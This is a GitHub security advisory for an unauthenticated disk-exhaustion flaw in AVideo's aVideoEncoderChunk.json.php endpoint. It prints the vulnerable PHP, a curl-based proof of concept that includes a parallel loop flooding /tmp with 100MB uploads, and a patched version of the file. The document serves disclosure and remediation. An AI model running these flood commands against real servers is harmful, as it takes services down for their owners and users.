# [H] AVideo Affected by Unauthenticated Disk Space Exhaustion via Unlimited Temp File Creation in aVideoEncoderChunk.json.php

## Summary
Severity: High
Advisory: GHSA-vv7w-qf5c-734w
CVE: CVE-2026-33483
CWE: CWE-770
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-03-20
Source: https://github.com/advisories/GHSA-vv7w-qf5c-734w
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The `aVideoEncoderChunk.json.php` endpoint is a completely standalone PHP script with no authentication, no framework includes, and no resource limits. An unauthenticated remote attacker can send arbitrary POST data which is written to persistent temp files in `/tmp/` with no size cap, no rate limiting, and no cleanup mechanism. This allows trivial disk space exhaustion leading to denial of service of the entire server.

## Details

The file `objects/aVideoEncoderChunk.json.php` (25 lines total) operates entirely outside the AVideo framework:

```php
// objects/aVideoEncoderChunk.json.php — full file
<?php
header('Access-Control-Allow-Origin: *');           // Line 2: CORS wildcard
header('Content-Type: application/json');
$obj = new stdClass();
$obj->file = tempnam(sys_get_temp_dir(), 'YTPChunk_');  // Line 5: creates /tmp/YTPChunk_XXXXXX

$putdata = fopen("php://input", "r");              // Line 7: reads raw POST body
$fp = fopen($obj->file, "w");

while ($data = fread($putdata, 1024 * 1024)) {     // Line 12: 1MB chunks, no limit
    fwrite($fp, $data);
}

fclose($fp);
fclose($putdata);
sleep(1);
$obj->filesize = filesize($obj->file);

$json = json_encode($obj);
die($json);                                         // Line 25: returns {"file":"/tmp/YTPChunk_abc123","filesize":104857600}
```

The vulnerability chain:

1. **No authentication**: The script includes no session handling, no `require_once` of the framework, no `useVideoHashOrLogin()`, no `canUpload()` — nothing. Compare with `aVideoEncoder.json.php` which includes `configuration.php` and calls authentication functions.

2. **No size limits**: `php://input` is read until exhaustion. The effective limit is PHP's `post_max_size`, which AVideo's `.htaccess` has commented-out settings for 4GB (`#php_value post_max_size 4G` at line 536). Default AVideo installations recommend at least 100MB.

3. **No cleanup**: A grep for `YTPChunk_` across the entire codebase returns only the chunk file itself. No cron job, no garbage collection, no consumer that deletes files after processing. The temp files persist until the server is manually cleaned.

4. **Path disclosure**: The response JSON includes the full filesystem temp path (e.g., `/tmp/YTPChunk_abc123`), revealing server directory structure.

5. **CORS wildcard**: `Access-Control-Allow-Origin: *` on line 2 means any malicious webpage can trigger this attack via the visitor's browser, potentially distributing the attack across many source IPs.

6. **Public routing**: `.htaccess` line 437 rewrites `/aVideoEncoderChunk.json` to this file, making it accessible at a clean URL.

## PoC

**Step 1: Confirm endpoint is accessible and unauthenticated**
```bash
curl -s -X POST https://target/aVideoEncoderChunk.json \
  -H 'Content-Type: application/octet-stream' \
  --data-binary 'test'
```
Expected output:
```json
{"file":"/tmp/YTPChunk_XXXXXX","filesize":4}
```

**Step 2: Write a large temp file (100MB)**
```bash
dd if=/dev/zero bs=1M count=100 2>/dev/null | \
  curl -s -X POST https://target/aVideoEncoderChunk.json \
  -H 'Content-Type: application/octet-stream' \
  --data-binary @-
```
Expected output:
```json
{"file":"/tmp/YTPChunk_YYYYYY","filesize":104857600}
```

**Step 3: Parallel disk exhaustion (10 concurrent 100MB requests = 1GB)**
```bash
for i in $(seq 1 10); do
  dd if=/dev/zero bs=1M count=100 2>/dev/null | \
    curl -s -X POST https://target/aVideoEncoderChunk.json \
    -H 'Content-Type: application/octet-stream' \
    --data-binary @- &
done
wait
```

**Step 4: Verify files persist (they are never cleaned up)**
```bash
# On the server:
ls -la /tmp/YTPChunk_*
# All files remain indefinitely
```

## Impact

- **Denial of Service**: Filling `/tmp/` causes cascading failures — PHP session handling breaks, MySQL temp tables fail, and system services relying on tmpfs crash. This can take down the entire server, not just AVideo.
- **No authentication barrier**: Any anonymous internet user can trigger this attack.
- **Cross-origin exploitation**: The CORS wildcard header allows any malicious website to use visitors' browsers as distributed attack proxies, bypassing IP-based rate limiting at the network level.
- **Information disclosure**: The temp file path in the response reveals the server's filesystem layout.
- **Persistence**: Created files are never cleaned up, so even a brief attack has lasting impact until manual intervention.

## Recommended Fix

Replace `objects/aVideoEncoderChunk.json.php` with a version that includes authentication, size limits, and cleanup:

```php
<?php
if (empty($global)) {
    $global = [];
}
require_once '../videos/configuration.php';

header('Content-Type: application/json');
allowOrigin(); // Use AVideo's configured CORS instead of wildcard

// Require authentication
$userObj = new User(0);
if (!User::canUpload()) {
    http_response_code(403);
    die(json_encode(['error' => true, 'msg' => 'Not authorized']));
}

// Enforce size limit (e.g., 200MB)
$maxSize = 200 * 1024 * 1024;
$contentLength = isset($_SERVER['CONTENT_LENGTH']) ? (int)$_SERVER['CONTENT_LENGTH'] : 0;
if ($contentLength > $maxSize) {
    http_response_code(413);
    die(json_encode(['error' => true, 'msg' => 'Payload too large']));
}

$obj = new stdClass();
$obj->file = tempnam(sys_get_temp_dir(), 'YTPChunk_');

$putdata = fopen("php://input", "r");
$fp = fopen($obj->file, "w");
$written = 0;

while ($data = fread($putdata, 1024 * 1024)) {
    $written += strlen($data);
    if ($written > $maxSize) {
        fclose($fp);
        fclose($putdata);
        unlink($obj->file);
        http_response_code(413);
        die(json_encode(['error' => true, 'msg' => 'Payload too large']));
    }
    fwrite($fp, $data);
}

fclose($fp);
fclose($putdata);

$obj->filesize = filesize($obj->file);
// Do not expose full filesystem path
$obj->file = basename($obj->file);

die(json_encode($obj));
```

Additionally, add a cleanup cron job or garbage collection to remove `YTPChunk_*` files older than a configurable timeout (e.g., 1 hour).

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-vv7w-qf5c-734w
- https://nvd.nist.gov/vuln/detail/CVE-2026-33483
- https://github.com/WWBN/AVideo/commit/33d1bae6c731ef1682fcdc47b428313be073a5d1
- https://github.com/WWBN/AVideo
